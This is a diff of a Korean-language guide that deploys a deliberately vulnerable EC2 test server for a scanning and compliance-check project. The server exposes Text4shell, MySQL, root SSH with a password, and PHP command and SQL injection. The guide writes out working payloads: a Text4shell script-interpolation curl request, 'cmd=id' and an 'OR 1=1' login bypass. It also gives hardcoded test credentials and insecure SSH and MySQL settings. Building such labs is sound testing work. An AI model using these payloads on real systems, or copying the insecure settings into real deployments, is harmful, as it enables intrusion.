@@ -1,160 +1,259 @@
-# 취약 웹 애플리케이션 배포 및 테스트 가이드
+# 취약 웹 앱 배포 가이드
 
-## 모식도 요구사항 분석
+## 개요
 
-### 1. 취약 웹 페이지 구성
-- ✅ **기본 취약점**: Command Injection, SQL Injection (이미 구현됨)
-- ⚠️ **Text4shell (CVE-2022-42889)**: 추가 구현 필요
-- ✅ **MySQL 포트 외부 노출**: 이미 구현됨 (`terraform/user_data/web_server.sh`)
-- ✅ **SSH 포트 외부 노출**: 이미 구현됨 (`terraform/vpc.tf`)
+이 가이드는 V2R 프로젝트 테스트를 위한 취약 웹 서버를 EC2에 배포하는 방법을 설명합니다.
 
-### 2. 외부 스캐닝
-- ✅ **네트워크 스캔**: Nmap 구현됨
-- ✅ **CVE 스캔**: Nuclei 구현됨
-- ✅ **DAST 스캔**: Nuclei 웹 템플릿 사용 가능
+## 배포된 취약점
 
-### 3. CCE 서버 점검
-- ❌ **전자금융기반시설 Linux 항목**: 미구현
-- ❌ **XML/JSON 출력 형식**: 미구현
-- ❌ **양호/취약 판정 로직**: 미구현
+### 1. Text4shell (CVE-2022-42889)
+- **포트**: 8080
+- **설명**: Apache Commons Text 1.9 취약 버전 사용
+- **엔드포인트**:
+  - `GET /api/interpolate?input=${script:javascript:...}`
+  - `POST /api/process` (JSON body)
+  - `GET /api/test` (테스트 페이지)
 
-## 현재 구현 상태
+### 2. MySQL 외부 노출
+- **포트**: 3306
+- **설정**: `bind-address = 0.0.0.0`
+- **계정**: `dvwa` / `p@ssw0rd`
+- **데이터베이스**: `dvwa`, `testdb`
 
-### ✅ 이미 구현된 부분
+### 3. SSH 외부 노출 및 취약 설정
+- **포트**: 22
+- **설정**:
+  - `PasswordAuthentication yes`
+  - `PermitRootLogin yes`
+  - root 비밀번호: `v2r_test_password` (테스트용)
 
-1. **취약 웹 서버 배포** (`terraform/user_data/web_server.sh`)
-   - Command Injection 취약점
-   - SQL Injection 취약점
-   - MySQL 외부 접근 허용 (포트 3306)
-   - SSH 포트 외부 노출 (포트 22)
-   - DVWA, Juice Shop 배포
+### 4. Command Injection (PHP)
+- **포트**: 80
+- **경로**: `/dvwa/index.php?cmd=...`
 
-2. **외부 스캐닝**
-   - Nmap 포트/서비스 스캔
-   - Nuclei 취약점 스캔
-   - 스캔 결과 정규화 및 DB 저장
+### 5. SQL Injection (PHP)
+- **포트**: 80
+- **경로**: `/dvwa/index.php` (POST)
 
-3. **PoC 재현 엔진**
-   - Docker 격리 환경
-   - 증거 수집 (strace, tcpdump, FS diff)
+## Terraform 배포
 
-## 추가 구현 필요 사항
-
-### 1. Text4shell (CVE-2022-42889) 취약 웹앱
-
-**구현 방법:**
-- Apache Commons Text 취약 버전 사용
-- Java 웹 애플리케이션 (Spring Boot 또는 Tomcat)
-- 취약한 문자열 보간 기능 포함
-
-**예시 코드:**
-```java
-// 취약한 코드
-StringSubstitutor substitutor = new StringSubstitutor();
-String result = substitutor.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('id')}");
-```
-
-### 2. CCE 서버 점검 모듈
-
-**필요 기능:**
-- 전자금융기반시설 2025년도 서버 Linux 항목 점검
-- 각 항목에 대한 IF문 기반 양호/취약 판정
-- XML/JSON 형식 출력
-
-**구현 구조:**
-```
-src/compliance/
-  ├── __init__.py
-  ├── cce_checker.py      # CCE 항목 점검 로직
-  ├── linux_checker.py    # Linux 서버 점검
-  └── report_generator.py # XML/JSON 리포트 생성
-```
-
-**점검 항목 예시:**
-- SSH PasswordAuthentication 설정
-- MySQL 외부 접근 설정
-- 불필요 서비스 실행 여부
-- 패키지 업데이트 상태
-- 방화벽 설정
-- 로그 설정
-
-## 구현 계획
-
-### Phase 1: Text4shell 취약 웹앱 추가
-
-1. **Java 웹 애플리케이션 생성**
-   - Spring Boot 프로젝트
-   - Apache Commons Text 1.9 (취약 버전) 의존성
-   - 취약한 엔드포인트 구현
-
-2. **Docker 컨테이너화**
-   - Dockerfile 작성
-   - `web_server.sh`에 배포 스크립트 추가
-
-3. **테스트**
-   - Text4shell PoC 실행
-   - Nuclei 템플릿으로 탐지 확인
-
-### Phase 2: CCE 서버 점검 모듈
-
-1. **점검 항목 정의**
-   - 전자금융기반시설 Linux 항목 리스트
-   - 각 항목별 판정 로직 (IF문)
-
-2. **점검 로직 구현**
-   - SSH 접속하여 설정 파일 확인
-   - 서비스 실행 상태 확인
-   - 패키지 버전 확인
-
-3. **리포트 생성**
-   - XML 형식 출력
-   - JSON 형식 출력
-   - 양호/취약/주의 상태 포함
-
-### Phase 3: 통합 테스트
-
-1. **전체 워크플로우 테스트**
-   - 취약 웹앱 배포
-   - 외부 스캐닝 실행
-   - CCE 서버 점검 실행
-   - 결과 통합 및 리포트 생성
-
-## 빠른 시작 (현재 상태에서)
-
-### 1. 취약 웹 서버 배포
+### 1. 사전 준비
 
 ```bash
-# Terraform으로 배포
 cd terraform
+
+# AWS 자격 증명 설정
+export AWS_ACCESS_KEY_ID=your_access_key
+export AWS_SECRET_ACCESS_KEY=your_secret_key
+export AWS_DEFAULT_REGION=ap-northeast-2
+```
+
+### 2. Terraform 초기화
+
+```bash
 terraform init
-terraform plan
+```
+
+### 3. 배포 실행
+
+```bash
 terraform apply
+```
 
+### 4. 출력 확인
+
+```bash
+terraform output
+```
+
+다음 정보를 확인하세요:
+- `web_server_public_ip`: 웹 서버 공인 IP
+- `web_server_private_ip`: 웹 서버 사설 IP
+- `scanner_public_ip`: 스캐너 서버 공인 IP
+
+## 배포 확인
+
+### 1. Text4shell 확인
+
+```bash
 # 웹 서버 IP 확인
-terraform output web_server_public_ip
+WEB_SERVER_IP=$(terraform output -raw web_server_public_ip)
+
+# Text4shell 테스트 페이지 접속
+curl "http://${WEB_SERVER_IP}:8080/api/test"
+
+# 취약점 테스트
+curl "http://${WEB_SERVER_IP}:8080/api/interpolate?input=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
 ```
 
-### 2. 외부 스캐닝 실행
+### 2. MySQL 외부 접근 확인
 
 ```bash
-# EC2에서 실행
-python -m src.pipeline.scanner_pipeline \
-  --target <web_server_ip> \
-  --scan-type nmap,nuclei
+# MySQL 접속 테스트
+mysql -h ${WEB_SERVER_IP} -u dvwa -p'p@ssw0rd' -e "SHOW DATABASES;"
 ```
 
-### 3. PoC 재현
+### 3. SSH 접속 확인
 
 ```bash
-# 스캔 결과 ID로 PoC 재현
-python -m src.pipeline.poc_pipeline \
-  --scan-result-id 1 \
-  --target-host <web_server_ip>
+# SSH 접속 테스트
+ssh -o StrictHostKeyChecking=no root@${WEB_SERVER_IP}
+# 비밀번호: v2r_test_password
 ```
 
-## 다음 단계
+### 4. PHP 취약점 확인
 
-1. **Text4shell 취약 웹앱 구현** (우선순위: 높음)
-2. **CCE 서버 점검 모듈 구현** (우선순위: 중간)
-3. **Ansible 연동** (우선순위: 낮음, 선택적)
+```bash
+# Command Injection 테스트
+curl "http://${WEB_SERVER_IP}/dvwa/index.php?cmd=id"
 
+# SQL Injection 테스트
+curl -X POST "http://${WEB_SERVER_IP}/dvwa/index.php" \
+  -d "username=admin' OR '1'='1&password=test"
+```
+
+## V2R 프로젝트로 스캔
+
+### 1. 외부 스캐닝 (외부자 관점)
+
+```bash
+# 스캐너 서버에서 실행
+cd /path/to/V2R
+
+# Nmap 스캔
+python -c "
+from src.pipeline.scanner_pipeline import ScannerPipeline
+scanner = ScannerPipeline()
+result = scanner.run_nmap_scan(
+    target='${WEB_SERVER_IP}',
+    ports='22,80,443,3306,8080',
+    save_to_db=True
+)
+print(result)
+"
+```
+
+### 2. CCE 서버 점검 (내부자 관점)
+
+```bash
+# 스캐너 서버에서 실행
+python scripts/test/test_cce_checker.py \
+  --host ${WEB_SERVER_IP} \
+  --username root \
+  --password v2r_test_password
+```
+
+**예상 결과:**
+- CCE-LNX-001: SSH PasswordAuthentication → **취약** (yes)
+- CCE-LNX-002: MySQL 외부 접근 → **취약** (bind-address = 0.0.0.0)
+- CCE-LNX-003: 불필요 서비스 → 양호/취약
+- CCE-LNX-004: 패키지 업데이트 → 주의/취약
+- CCE-LNX-005: 방화벽 상태 → 취약 (비활성화 가능)
+
+## 전체 테스트 워크플로우
+
+### 1. 인프라 배포
+
+```bash
+cd terraform
+terraform apply
+```
+
+### 2. 웹 서버 준비 대기
+
+```bash
+# 웹 서버 초기화 완료 대기 (약 2-3분)
+sleep 180
+```
+
+### 3. 외부 스캐닝
+
+```bash
+# 스캐너 서버에서
+python scripts/test/test_vulnerable_web_deployment.py \
+  --target ${WEB_SERVER_IP}
+```
+
+### 4. CCE 서버 점검
+
+```bash
+# 스캐너 서버에서
+python scripts/test/test_cce_checker.py \
+  --host ${WEB_SERVER_IP} \
+  --username root \
+  --password v2r_test_password
+```
+
+### 5. 대시보드에서 확인
+
+```bash
+# 스캐너 서버에서
+streamlit run src/dashboard/app.py --server.port 8501 --server.address 0.0.0.0
+```
+
+브라우저에서 접속:
+- 취약점 리스트 확인
+- CCE 점검 결과 확인
+- 우선순위 확인
+
+## 보안 주의사항
+
+⚠️ **중요**: 이 설정은 **테스트 환경에서만** 사용하세요!
+
+1. **SSH 비밀번호 인증**: 실제 환경에서는 키 기반 인증 사용
+2. **MySQL 외부 노출**: 실제 환경에서는 VPC 내부에서만 접근 허용
+3. **SSH 포트 외부 노출**: 실제 환경에서는 특정 IP만 허용
+4. **root 비밀번호**: 테스트용으로만 사용, 실제 환경에서는 절대 사용 금지
+
+## 리소스 정리
+
+```bash
+cd terraform
+terraform destroy
+```
+
+## 문제 해결
+
+### Text4shell 앱이 시작되지 않는 경우
+
+```bash
+# 웹 서버에 SSH 접속
+ssh root@${WEB_SERVER_IP}
+
+# 로그 확인
+tail -f /var/log/text4shell-app.log
+tail -f /var/log/text4shell-setup.log
+
+# 수동 시작
+cd /opt/text4shell-app
+java -jar target/text4shell-vulnerable-1.0.0.jar
+```
+
+### MySQL 접속 실패
+
+```bash
+# MySQL 서비스 확인
+systemctl status mysql
+
+# MySQL 설정 확인
+grep bind-address /etc/mysql/mysql.conf.d/mysqld.cnf
+
+# MySQL 재시작
+systemctl restart mysql
+```
+
+### SSH 접속 실패
+
+```bash
+# SSH 설정 확인
+grep -E "PasswordAuthentication|PermitRootLogin" /etc/ssh/sshd_config
+
+# SSH 재시작
+systemctl restart sshd
+```
+
+## 참고
+
+- Text4shell 앱은 Spring Boot로 실행되며, 시작에 시간이 걸릴 수 있습니다 (약 1-2분)
+- 모든 서비스가 준비될 때까지 약 3-5분 정도 기다려주세요
+- 로그는 `/var/log/user-data.log`에서 확인할 수 있습니다
